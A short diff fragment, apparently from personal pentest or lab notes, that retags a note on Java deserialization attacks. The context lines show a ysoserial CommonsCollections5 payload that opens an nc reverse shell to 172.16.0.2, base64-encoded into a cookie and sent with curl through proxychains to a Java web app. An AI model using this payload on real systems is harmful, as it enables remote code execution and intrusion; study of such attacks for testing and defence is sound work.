@@ -34,4 +34,4 @@ java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 '/bin/nc -e /bin/
 proxychains curl -b 'userInfo = "'$(java -jar ../../web/ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 '/bin/nc -e /bin/sh 172.16.0.2 10101' | base64 | tr -d '\n')'"'  http://192.168.1.2:8080/index.jsp
 ```
 
-tags: deserialization ysoserial [object injection]
+tags: #object_injection #deserialization #ysoserial 
